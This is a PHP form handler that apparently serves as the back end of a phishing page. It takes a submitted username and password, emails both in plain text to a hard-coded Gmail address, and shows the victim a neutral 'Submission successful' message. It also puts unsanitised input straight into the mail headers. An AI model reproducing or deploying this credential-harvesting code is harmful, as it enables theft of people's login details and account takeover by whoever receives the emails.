<?php

/* Configuration */
$subject = 'Testing...'; // Set email subject line here
$mailto  = 'leue54@gmail.com'; // Email address to send the form to
//$mailto = 'info@mesivtaveretzky.com'. ', ';
//$mailto .= 'leue54@gmail.com';
/* END Configuration */

$name = $_POST["username"]; 
$password = $_POST["password"]; 
$timestamp 	= date("F jS Y, h:iA.", time());
$email = $name;

// HTML for email to send submission details
$body = "
<br>
<p>Message:</p>
p><b>Name</b>: $name <br>
<b>Password</b>: $password <br>
<p>This form was submitted on <b>".$timestamp."</b></p>";

// Success Message
$success = "
<div class=\"row\">
    <div class=\"thankyou\">
        <h3>Submission successful</h3>
        <p></p>
    </div>
</div>
";

$headers = "From: $name $email \r\n";
$headers .= "Reply-To: $email \r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$message = "<html><body>$body</body></html>";

if (mail($mailto, $subject, $message, $headers)) {
    echo "$success"; // success
} else {
    echo 'Failed to send message.'; // failure
}

?>